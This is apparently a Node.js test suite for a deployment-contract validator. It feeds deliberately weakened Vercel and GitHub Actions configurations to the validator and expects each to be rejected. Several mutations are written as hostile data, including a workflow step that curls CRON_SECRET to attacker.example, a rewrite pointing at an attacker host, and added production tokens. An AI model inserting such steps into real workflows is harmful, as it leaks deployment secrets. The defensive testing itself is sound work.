import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import { test } from 'node:test';

import {
  inspectDeploymentContract,
  validateDeploymentContract,
} from '../../scripts/check-deployability.mjs';

function currentContract() {
  return {
    vercel: JSON.parse(readFileSync('vercel.json', 'utf8')),
    packageJson: JSON.parse(readFileSync('package.json', 'utf8')),
    outboxWorkflow: readFileSync('.github/workflows/outbox-dispatch.yml', 'utf8'),
    outboxWatchdogWorkflow: readFileSync('.github/workflows/outbox-dispatch-watchdog.yml', 'utf8'),
    outboxWatchdogScript: readFileSync('scripts/github-outbox-dispatch-watchdog.mjs', 'utf8'),
    productionSmokeWorkflow: readFileSync('.github/workflows/production-smoke.yml', 'utf8'),
    executionSmokeWorkflow: readFileSync('.github/workflows/execution-smoke.yml', 'utf8'),
    executionSmokeScript: readFileSync('scripts/github-execution-smoke.mjs', 'utf8'),
    files: new Set([
      'index.html',
      'package-lock.json',
      'package.json',
      'vercel.json',
      '.github/workflows/outbox-dispatch.yml',
      '.github/workflows/outbox-dispatch-watchdog.yml',
      'scripts/github-outbox-dispatch-watchdog.mjs',
      '.github/workflows/production-smoke.yml',
      'scripts/production-smoke.mjs',
      '.github/workflows/execution-smoke.yml',
      'scripts/github-execution-smoke.mjs',
      ...readdirSync('api').filter(file => file.endsWith('.js')).map(file => `api/${file}`),
    ]),
  };
}

function cloneContract() {
  const contract = currentContract();
  return {
    ...contract,
    vercel: structuredClone(contract.vercel),
    packageJson: structuredClone(contract.packageJson),
    files: new Set(contract.files),
  };
}

test('current repository satisfies the provider-neutral deployment contract', () => {
  assert.deepEqual(inspectDeploymentContract(), []);
  assert.deepEqual(validateDeploymentContract(currentContract()), []);
});

test('missing route handlers and an early SPA fallback fail closed', () => {
  const contract = cloneContract();
  contract.files.delete('api/ops.js');
  contract.vercel.rewrites.unshift(contract.vercel.rewrites.pop());

  const errors = validateDeploymentContract(contract);
  assert.ok(errors.includes('rewrite /api/settings/availability targets missing handler api/ops.js'));
  assert.ok(errors.includes('the final rewrite must be the SPA fallback /(.*) -> /'));
});

test('the SPA fallback must target the clean root, not /index.html', () => {
  const contract = cloneContract();
  contract.vercel.rewrites.at(-1).destination = '/index.html';
  const errors = validateDeploymentContract(contract);
  assert.ok(errors.includes('the final rewrite must be the SPA fallback /(.*) -> /'));
});

test('every non-fallback rewrite must target a local one-segment API handler', () => {
  for (const destination of ['/api/missing/nested', '/typo', 'https://attacker.example/api/ops']) {
    const contract = cloneContract();
    contract.vercel.rewrites[0].destination = destination;
    const errors = validateDeploymentContract(contract);
    assert.ok(errors.includes(
      `rewrite ${contract.vercel.rewrites[0].source} must target a local grouped API handler`,
    ));
  }
});

test('unsafe response headers and unwired cron paths are rejected', () => {
  const contract = cloneContract();
  contract.vercel.headers.find(route => route.source === '/api/(.*)').headers = [];
  contract.vercel.headers.find(route => route.source === '/(.*)').headers = [];
  contract.vercel.crons = [{ path: '/api/cron/missing', schedule: 'every Sunday' }];

  const errors = validateDeploymentContract(contract);
  assert.ok(errors.includes('API routes must set Cache-Control to no-store'));
  assert.ok(errors.includes('page routes must define a safe content-security-policy'));
  assert.ok(errors.includes('cron path has no matching rewrite: /api/cron/missing'));
  assert.ok(errors.includes('cron /api/cron/missing must use a five-field schedule'));
});

test('required files and unique routes are part of the contract', () => {
  const contract = cloneContract();
  contract.files.delete('package-lock.json');
  contract.vercel.rewrites.splice(1, 0, structuredClone(contract.vercel.rewrites[0]));

  const errors = validateDeploymentContract(contract);
  assert.ok(errors.includes('required deployment file is missing: package-lock.json'));
  assert.ok(errors.includes(`duplicate rewrite source: ${contract.vercel.rewrites[0].source}`));
});

test('the package runtime must match the Node 24 CI and deployment contract', () => {
  for (const nodeRange of ['>=22', '>=999', '>=24 || >=0', '24', '^24.0.0']) {
    const contract = cloneContract();
    contract.packageJson.engines.node = nodeRange;
    assert.ok(validateDeploymentContract(contract).includes('package.json engines.node must be 24.x'));
  }
});

test('security headers must retain their minimum-safe values, not merely their names', () => {
  const unsafeValues = new Map([
    ['Content-Security-Policy', "default-src *; object-src 'self'; frame-ancestors *; base-uri *"],
    ['Permissions-Policy', 'geolocation=(self)'],
    ['Referrer-Policy', 'unsafe-url'],
    ['Strict-Transport-Security', 'max-age=0'],
    ['X-Content-Type-Options', 'sniff'],
    ['X-Frame-Options', 'ALLOWALL'],
  ]);

  for (const [headerName, unsafeValue] of unsafeValues) {
    const contract = cloneContract();
    const header = contract.vercel.headers
      .find(route => route.source === '/(.*)').headers
      .find(item => item.key === headerName);
    header.value = unsafeValue;
    assert.ok(validateDeploymentContract(contract).includes(
      `page routes must define a safe ${headerName.toLowerCase()}`,
    ));
  }
});

test('duplicate CSP and HSTS directives fail closed instead of hiding unsafe first values', () => {
  const contract = cloneContract();
  const pageHeaders = contract.vercel.headers.find(route => route.source === '/(.*)').headers;
  const csp = pageHeaders.find(item => item.key === 'Content-Security-Policy');
  const hsts = pageHeaders.find(item => item.key === 'Strict-Transport-Security');
  csp.value = `default-src *; object-src *; frame-ancestors *; ${csp.value}`;
  hsts.value = `max-age=0; ${hsts.value}`;

  const errors = validateDeploymentContract(contract);
  assert.ok(errors.includes('page routes must define a safe content-security-policy'));
  assert.ok(errors.includes('page routes must define a safe strict-transport-security'));
});

test('the gate remains green when preview quota is simulated as exhausted', () => {
  const result = spawnSync(process.execPath, ['scripts/check-deployability.mjs'], {
    encoding: 'utf8',
    env: {
      ...process.env,
      HTTPS_PROXY: 'http://127.0.0.1:9',
      VERCEL_PREVIEW_QUOTA_STATE: 'exhausted',
      VERCEL_TOKEN: 'deliberately-unusable',
    },
  });

  assert.equal(result.status, 0, result.stderr || result.stdout);
  assert.deepEqual(JSON.parse(result.stdout), {
    ok: true,
    gate: 'repository-deployability-contract',
    providerNetworkRequired: false,
  });
});

test('the GitHub gate has read-only permissions and no deployment-provider dependency', () => {
  const workflow = readFileSync('.github/workflows/deployability.yml', 'utf8');
  assert.match(workflow, /^name: deployability$/m);
  assert.match(workflow, /^\s{2}deployability:$/m);
  assert.match(workflow, /^\s{2}contents: read$/m);
  assert.match(workflow, /npm run check:deployability/);
  assert.match(workflow, /npm run test:deployability/);
  assert.doesNotMatch(
    workflow,
    /pull_request_target|secrets\.|npx\s+vercel|\bvercel\s+(build|deploy|pull)|VERCEL_TOKEN/,
  );
  assert.doesNotMatch(workflow, /uses:\s+actions\/(?:checkout|setup-node)@v\d+/);
});

test('the outbox scheduler is five-minute, manually recoverable, secret-bound, and deadline-capped',()=>{
  const contract=currentContract();
  assert.deepEqual(validateDeploymentContract(contract),[]);
  assert.match(contract.outboxWorkflow,/cron:\s*['"]\*\/5 \* \* \* \*['"]/);
  assert.match(contract.outboxWorkflow,/workflow_dispatch:/);
  assert.match(contract.outboxWorkflow,
    /if:\s*github\.ref == format\('refs\/heads\/\{0\}', github\.event\.repository\.default_branch\)/);
  assert.match(contract.outboxWorkflow,/environment:\s*production/);
  assert.match(contract.outboxWorkflow,/vars\.APP_URL/);
  assert.match(contract.outboxWorkflow,/secrets\.CRON_SECRET/);
  assert.match(contract.outboxWorkflow,/--max-time 55 --retry 0 --request POST/);
});

test('deployability rejects an unsafe or incomplete outbox scheduler',()=>{
  const missingSecret=cloneContract();
  missingSecret.outboxWorkflow=missingSecret.outboxWorkflow.replace(
    'CRON_SECRET: ${{ secrets.CRON_SECRET }}','CRON_SECRET: hard-coded-secret',
  );
  assert.ok(validateDeploymentContract(missingSecret).includes(
    'outbox workflow must read CRON_SECRET from GitHub secrets',
  ));

  const pullRequest=cloneContract();
  pullRequest.outboxWorkflow=pullRequest.outboxWorkflow.replace(
    'workflow_dispatch:','workflow_dispatch:\n  pull_request:',
  );
  assert.ok(validateDeploymentContract(pullRequest).includes(
    'outbox workflow must not expose production secrets to pull-request code or logs',
  ));

  const unbounded=cloneContract();
  unbounded.outboxWorkflow=unbounded.outboxWorkflow.replace('--max-time 55 --retry 0','--retry 3');
  assert.ok(validateDeploymentContract(unbounded).includes(
    'outbox workflow must bound the request without automatic duplicate retries',
  ));

  const featureBranch=cloneContract();
  featureBranch.outboxWorkflow=featureBranch.outboxWorkflow.replace(
    "if: github.ref == format('refs/heads/{0}', github.event.repository.default_branch)\n",'',
  );
  assert.ok(validateDeploymentContract(featureBranch).includes(
    'outbox workflow must restrict production dispatch to the default branch',
  ));

  const workerDeadline=cloneContract();
  workerDeadline.outboxWorkflow=workerDeadline.outboxWorkflow.replace(
    'timeout-minutes: 2','timeout-minutes: 3',
  );
  assert.ok(validateDeploymentContract(workerDeadline).includes(
    'outbox workflow must retain its two-minute worker deadline',
  ));
});

test('the outbox watchdog is hourly, bounded, read-only, and limited to the health credential',()=>{
  const contract=currentContract();
  assert.deepEqual(validateDeploymentContract(contract),[]);
  assert.match(contract.outboxWatchdogWorkflow,/cron:\s*['"]37 \* \* \* \*['"]/);
  assert.match(contract.outboxWatchdogWorkflow,/actions:\s*read/);
  assert.match(contract.outboxWatchdogWorkflow,/contents:\s*read/);
  assert.match(contract.outboxWatchdogWorkflow,/WATCHDOG_WORKER_DEADLINE_MS:\s*'120000'/);
  assert.match(contract.outboxWatchdogWorkflow,/scripts\/github-outbox-dispatch-watchdog\.mjs/);
  assert.match(contract.outboxWatchdogWorkflow,/^    environment: production$/m);
  assert.deepEqual(contract.outboxWatchdogWorkflow.match(/(?:secrets|vars)\.[A-Z_]+/g),
    ['vars.APP_URL','secrets.CRON_SECRET']);
  assert.doesNotMatch(contract.outboxWatchdogWorkflow,/\/api\/cron\/outbox|pull_request_target|TURSO_|RESEND_/);
});

const UNSAFE_WATCHDOG='outbox watchdog must remain read-only, non-mutating, and limited to its reviewed health credential';

test('deployability rejects a weakened or privileged outbox watchdog',()=>{
  const missing=cloneContract();
  missing.files.delete('.github/workflows/outbox-dispatch-watchdog.yml');
  missing.outboxWatchdogWorkflow=null;
  let errors=validateDeploymentContract(missing);
  assert.ok(errors.includes(
    'required deployment file is missing: .github/workflows/outbox-dispatch-watchdog.yml'));
  assert.ok(errors.includes('outbox watchdog workflow must be readable'));

  const delayed=cloneContract();
  delayed.outboxWatchdogWorkflow=delayed.outboxWatchdogWorkflow.replace(
    "WATCHDOG_WORKER_DEADLINE_MS: '120000'","WATCHDOG_WORKER_DEADLINE_MS: '900000'",
  );
  errors=validateDeploymentContract(delayed);
  assert.ok(errors.includes('outbox watchdog must bind the two-minute dispatcher deadline'));

  const privileged=cloneContract();
  privileged.outboxWatchdogWorkflow=privileged.outboxWatchdogWorkflow.replace(
    'contents: read','contents: write\n  environment: production\n  CRON_SECRET: ${{ secrets.CRON_SECRET }}',
  );
  errors=validateDeploymentContract(privileged);
  assert.ok(errors.includes(UNSAFE_WATCHDOG));
  assert.ok(errors.includes('outbox watchdog must have read-only contents access'));

  const mutableAction=cloneContract();
  mutableAction.outboxWatchdogWorkflow=mutableAction.outboxWatchdogWorkflow.replace(
    'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1','actions/checkout@main',
  ).replace('persist-credentials: false','persist-credentials: true');
  errors=validateDeploymentContract(mutableAction);
  assert.ok(errors.includes('outbox watchdog checkout must use the reviewed immutable revision'));
  assert.ok(errors.includes('outbox watchdog checkout must not persist GitHub credentials'));

  const cadence=cloneContract();
  cadence.outboxWatchdogWorkflow=cadence.outboxWatchdogWorkflow.replace(
    "cron: '37 * * * *'","cron: '*/5 * * * *'",
  );
  assert.ok(validateDeploymentContract(cadence).includes(
    'outbox watchdog must run hourly on its documented offset',
  ));

  for(const suffix of [' || true','; exit 0']){
    const suppressed=cloneContract();
    suppressed.outboxWatchdogWorkflow=suppressed.outboxWatchdogWorkflow.replace(
      'run: node scripts/github-outbox-dispatch-watchdog.mjs',
      `run: node scripts/github-outbox-dispatch-watchdog.mjs${suffix}`,
    );
    errors=validateDeploymentContract(suppressed);
    assert.ok(errors.includes('outbox watchdog must run the reviewed assessor'));
    assert.ok(errors.includes(
      'outbox watchdog assessment step must retain its exact fail-closed shape'));
  }

  const continued=cloneContract();
  continued.outboxWatchdogWorkflow=continued.outboxWatchdogWorkflow.replace(
    'run: node scripts/github-outbox-dispatch-watchdog.mjs',
    'continue-on-error: true\n        run: node scripts/github-outbox-dispatch-watchdog.mjs',
  );
  errors=validateDeploymentContract(continued);
  assert.ok(errors.includes(UNSAFE_WATCHDOG));
  assert.ok(errors.includes('outbox watchdog assessment step must retain its exact fail-closed shape'));

  const extraShell=cloneContract();
  extraShell.outboxWatchdogWorkflow=extraShell.outboxWatchdogWorkflow.replace(
    'run: node scripts/github-outbox-dispatch-watchdog.mjs',
    "run: node scripts/github-outbox-dispatch-watchdog.mjs\n        shell: bash -c 'true' -- {0}",
  );
  assert.ok(validateDeploymentContract(extraShell).includes(
    'outbox watchdog workflow must match its reviewed immutable contract'));

  for(const [from,to] of [
    ['          CRON_SECRET: ${{ secrets.CRON_SECRET }}\n',
      '          CRON_SECRET: ${{ secrets.CRON_SECRET }}\n          TURSO_AUTH_TOKEN: ${{ secrets.TURSO_AUTH_TOKEN }}\n'],
    ['secrets.CRON_SECRET','secrets.TURSO_AUTH_TOKEN'],
    ['vars.APP_URL','vars.OTHER_URL'],
  ]){
    const widened=cloneContract();
    widened.outboxWatchdogWorkflow=widened.outboxWatchdogWorkflow.replace(from,to);
    assert.ok(validateDeploymentContract(widened).includes(UNSAFE_WATCHDOG),to);
  }

  const unprotected=cloneContract();
  unprotected.outboxWatchdogWorkflow=unprotected.outboxWatchdogWorkflow.replace('    environment: production\n','');
  assert.ok(validateDeploymentContract(unprotected).includes(
    'outbox watchdog must read delivery health through the protected production environment'));

  const replacedAssessor=cloneContract();
  replacedAssessor.outboxWatchdogScript='process.exitCode=0;\n';
  assert.ok(validateDeploymentContract(replacedAssessor).includes(
    'outbox watchdog assessor must match its reviewed immutable contract'));
});

test('deployability rejects a production smoke workflow that gains secrets, writes, or broader triggers',()=>{
  assert.deepEqual(validateDeploymentContract(cloneContract()),[]);
  const unsafe='production smoke must remain secret-free, read-only, and non-mutating';
  for(const [from,to] of [
    ['  contents: read\n','  contents: write\n'],
    ['  deployment_status:\n','  deployment_status:\n  pull_request_target:\n'],
    ['          SMOKE_BASE_URL: ${{ inputs.base_url }}','          SMOKE_BASE_URL: ${{ secrets.APP_URL }}'],
    ['    runs-on: ubuntu-24.04','    environment: production\n    runs-on: ubuntu-24.04'],
  ]){
    const original=cloneContract().productionSmokeWorkflow;
    const mutated=cloneContract();
    mutated.productionSmokeWorkflow=original.replace(from,to);
    assert.notEqual(mutated.productionSmokeWorkflow,original);
    assert.ok(validateDeploymentContract(mutated).includes(unsafe),`expected rejection for ${to.trim()}`);
  }

  const anyEnvironment=cloneContract();
  anyEnvironment.productionSmokeWorkflow=anyEnvironment.productionSmokeWorkflow.replace(
    "github.event.deployment.environment == 'Production'",'true');
  assert.ok(validateDeploymentContract(anyEnvironment).includes(
    'production smoke must run only for the Vercel Production environment'));

  // GitHub records a "production" deployment for every environment job, and
  // expression comparison ignores case, so only Vercel-created ones may run it.
  assert.match(cloneContract().productionSmokeWorkflow,
    /github\.event\.deployment\.creator\.login == 'vercel\[bot\]' &&\n/);
  for(const [from,to] of [
    ["      github.event.deployment.creator.login == 'vercel[bot]' &&\n",''],
    ["creator.login == 'vercel[bot]'","creator.login != ''"],
  ]){
    const anyCreator=cloneContract();
    anyCreator.productionSmokeWorkflow=anyCreator.productionSmokeWorkflow.replace(from,to);
    assert.notEqual(anyCreator.productionSmokeWorkflow,cloneContract().productionSmokeWorkflow);
    assert.ok(validateDeploymentContract(anyCreator).includes(
      'production smoke must ignore deployments that GitHub environment jobs create'),to);
  }

  const missing=cloneContract();
  missing.productionSmokeWorkflow=null;
  assert.ok(validateDeploymentContract(missing).includes('production smoke workflow must be readable'));

  const renamedScript=cloneContract();
  renamedScript.packageJson.scripts['smoke:production']='node -e 0';
  assert.ok(validateDeploymentContract(renamedScript).includes(
    'package.json must define smoke:production as node scripts/production-smoke.mjs'));
});

// Issue #342: a run that Vercel's deployment starts is attributed to
// vercel[bot], so its job's own environment deployment passes the creator
// check. Its statuses link to the Actions run instead of *.vercel.app.
const TARGET_URL_CONDITION="!startsWith(github.event.deployment_status.target_url, 'https://github.com/')";
const GITHUB_STATUS_DEPLOYMENT='production smoke must ignore environment deployments whose status links to GitHub';
const PRODUCTION_SMOKE_EVENT_DATA='production smoke may read deployment event data only in its job condition';
const EXECUTION_SMOKE_EVENT_DATA='execution smoke may read deployment event data only in its job condition';

test('both smoke workflows ignore deployments whose status links to a GitHub Actions run',()=>{
  const contract=currentContract();
  assert.deepEqual(validateDeploymentContract(contract),[]);
  for(const workflow of [contract.productionSmokeWorkflow,contract.executionSmokeWorkflow]){
    assert.ok(workflow.includes(`creator.login == 'vercel[bot]' &&\n      ${TARGET_URL_CONDITION})`));
    // The URL appears once, in the job condition, and never in a step.
    assert.equal(workflow.split('target_url').length,2);
    const condition=/^ {4}if: >-\n(?: {6}.+\n)+/m.exec(workflow)[0];
    assert.ok(condition.includes(TARGET_URL_CONDITION));
    assert.doesNotMatch(workflow.replace(condition,''),/github\.event\.deployment|target_url/);
  }
});

test('deployability rejects a production smoke that drops or weakens the target URL check',()=>{
  const step='        run: |\n';
  for(const [from,to,expected] of [
    [` &&\n      ${TARGET_URL_CONDITION})`,')',[GITHUB_STATUS_DEPLOYMENT,PRODUCTION_SMOKE_EVENT_DATA]],
    [TARGET_URL_CONDITION,TARGET_URL_CONDITION.slice(1),[GITHUB_STATUS_DEPLOYMENT]],
    ["'https://github.com/'","'https://example.com/'",[GITHUB_STATUS_DEPLOYMENT]],
    [`' &&\n      ${TARGET_URL_CONDITION}`,`' ||\n      ${TARGET_URL_CONDITION}`,[GITHUB_STATUS_DEPLOYMENT,
      'production smoke must ignore deployments that GitHub environment jobs create']],
    ['          SMOKE_BASE_URL: ${{ inputs.base_url }}\n',
      '          SMOKE_BASE_URL: ${{ inputs.base_url }}\n          TARGET: ${{ github.event.deployment_status.target_url }}\n',
      [PRODUCTION_SMOKE_EVENT_DATA]],
    [step,`${step}          echo "\${{ github.event.deployment.sha }}"\n`,[PRODUCTION_SMOKE_EVENT_DATA]],
    [/^ {4}if: >-\n(?: {6}.+\n)+/m,'',[GITHUB_STATUS_DEPLOYMENT,PRODUCTION_SMOKE_EVENT_DATA]],
  ]){
    const mutated=cloneContract();
    mutated.productionSmokeWorkflow=mutated.productionSmokeWorkflow.replace(from,to);
    assert.notEqual(mutated.productionSmokeWorkflow,cloneContract().productionSmokeWorkflow,from);
    const errors=validateDeploymentContract(mutated);
    for(const message of expected) assert.ok(errors.includes(message),`${JSON.stringify(to)} -> ${message}\n${errors.join('\n')}`);
  }
});

const UNSAFE_EXECUTION_SMOKE='execution smoke must remain read-only, non-mutating, and limited to its reviewed cron credential';

test('the execution smoke is pinned, least-privilege, and limited to the cron credential',()=>{
  const contract=currentContract();
  assert.deepEqual(validateDeploymentContract(contract),[]);
  assert.match(contract.executionSmokeWorkflow,/^    environment: production$/m);
  assert.deepEqual(contract.executionSmokeWorkflow.match(/(?:secrets|vars)\.[A-Z_]+/g),
    ['vars.APP_URL','secrets.CRON_SECRET']);
  assert.match(contract.executionSmokeWorkflow,/github\.event\.deployment\.creator\.login == 'vercel\[bot\]' &&\n/);
  assert.ok(contract.executionSmokeWorkflow.includes(`      ${TARGET_URL_CONDITION}) ||\n`));
  assert.doesNotMatch(contract.executionSmokeWorkflow,/pull_request|TURSO_|RESEND_|VERCEL_/);
});

test('deployability rejects a widened, re-triggerable, or replaced execution smoke',()=>{
  const missing=cloneContract();
  missing.files.delete('.github/workflows/execution-smoke.yml');
  missing.files.delete('scripts/github-execution-smoke.mjs');
  missing.executionSmokeWorkflow=null;
  missing.executionSmokeScript=undefined;
  let errors=validateDeploymentContract(missing);
  for(const expected of [
    'required deployment file is missing: .github/workflows/execution-smoke.yml',
    'required deployment file is missing: scripts/github-execution-smoke.mjs',
    'execution smoke workflow must be readable',
    'execution smoke workflow must match its reviewed immutable contract',
    'execution smoke assessor must match its reviewed immutable contract',
  ]) assert.ok(errors.includes(expected),expected);

  const mutations=[
    ['  workflow_dispatch:\n','  workflow_dispatch:\n  pull_request:\n',
      ['execution smoke triggers must be deployment_status, one daily schedule, and workflow_dispatch only',
        UNSAFE_EXECUTION_SMOKE]],
    ['  deployment_status:\n','  deployment_status:\n  pull_request_target:\n',[UNSAFE_EXECUTION_SMOKE]],
    ["    - cron: '29 7 * * *'","    - cron: '*/5 * * * *'",
      ['execution smoke triggers must be deployment_status, one daily schedule, and workflow_dispatch only']],
    ['  contents: read\n','  contents: write\n',
      ['execution smoke permissions must be contents: read only',UNSAFE_EXECUTION_SMOKE]],
    ["      github.event.deployment.creator.login == 'vercel[bot]' &&\n",'',
      ['execution smoke must run only for successful Vercel Production deployments or from the default branch']],
    [` &&\n      ${TARGET_URL_CONDITION})`,')',
      ['execution smoke must run only for successful Vercel Production deployments or from the default branch',
        EXECUTION_SMOKE_EVENT_DATA]],
    [TARGET_URL_CONDITION,TARGET_URL_CONDITION.slice(1),
      ['execution smoke must run only for successful Vercel Production deployments or from the default branch']],
    ["'https://github.com/'","'https://vercel.app/'",
      ['execution smoke must run only for successful Vercel Production deployments or from the default branch']],
    ["          EXECUTION_SMOKE_TIMEOUT_MS: '100000'\n",
      "          EXECUTION_SMOKE_TIMEOUT_MS: '100000'\n          TARGET_URL: ${{ github.event.deployment_status.target_url }}\n",
      ['execution smoke step must retain its exact fail-closed shape',EXECUTION_SMOKE_EVENT_DATA]],
    ["github.event.deployment.environment == 'Production'","github.event.deployment.environment != ''",
      ['execution smoke must run only for successful Vercel Production deployments or from the default branch']],
    ['    environment: production\n','',
      ['execution smoke must read its credential through the production environment']],
    ['    timeout-minutes: 5\n','    timeout-minutes: 60\n',['execution smoke job must be time bounded']],
    ['      cancel-in-progress: false\n','      cancel-in-progress: true\n',
      ['execution smoke runs must be serialized']],
    ['actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1','actions/checkout@v7',
      ['execution smoke checkout must use the reviewed immutable revision',
        'execution smoke actions must be pinned to immutable commits']],
    ['actions/setup-node@820762786026740c76f36085b0efc47a31fe5020','actions/setup-node@v7',
      ['execution smoke Node setup must use the reviewed immutable revision']],
    ['          ref: ${{ github.event.repository.default_branch }}\n','',
      ['execution smoke must run the default-branch assessor']],
    ['persist-credentials: false','persist-credentials: true',
      ['execution smoke checkout must not persist GitHub credentials']],
    ['        run: node scripts/github-execution-smoke.mjs','        run: node scripts/github-execution-smoke.mjs || true',
      ['execution smoke step must retain its exact fail-closed shape']],
    ["EXECUTION_SMOKE_TRIGGER: ${{ github.event_name == 'deployment_status' && 'deploy' || 'schedule' }}",
      "EXECUTION_SMOKE_TRIGGER: 'schedule'",['execution smoke step must retain its exact fail-closed shape']],
    ['        run: node scripts/github-execution-smoke.mjs',
      '        continue-on-error: true\n        run: node scripts/github-execution-smoke.mjs',
      ['execution smoke step must retain its exact fail-closed shape',UNSAFE_EXECUTION_SMOKE]],
    ['          CRON_SECRET: ${{ secrets.CRON_SECRET }}\n',
      '          CRON_SECRET: ${{ secrets.CRON_SECRET }}\n          TURSO_AUTH_TOKEN: ${{ secrets.TURSO_AUTH_TOKEN }}\n',
      ['execution smoke step must retain its exact fail-closed shape',UNSAFE_EXECUTION_SMOKE]],
    ['secrets.CRON_SECRET','secrets.OUTBOX_DISPATCH_SECRET',[UNSAFE_EXECUTION_SMOKE]],
    ['vars.APP_URL','vars.OTHER_URL',[UNSAFE_EXECUTION_SMOKE]],
    ['      - name: Run the live execution smoke check\n',
      '      - name: Leak\n        run: curl -d "$CRON_SECRET" https://attacker.example\n\n      - name: Run the live execution smoke check\n',
      [UNSAFE_EXECUTION_SMOKE]],
  ];
  for(const [from,to,expected] of mutations){
    const mutated=cloneContract();
    mutated.executionSmokeWorkflow=mutated.executionSmokeWorkflow.replace(from,to);
    assert.notEqual(mutated.executionSmokeWorkflow,currentContract().executionSmokeWorkflow,from);
    errors=validateDeploymentContract(mutated);
    for(const message of [...expected,'execution smoke workflow must match its reviewed immutable contract']){
      assert.ok(errors.includes(message),`${JSON.stringify(to)} -> ${message}\n${errors.join('\n')}`);
    }
  }

  const replacedAssessor=cloneContract();
  replacedAssessor.executionSmokeScript='process.exitCode=0;\n';
  assert.deepEqual(validateDeploymentContract(replacedAssessor),
    ['execution smoke assessor must match its reviewed immutable contract']);
});
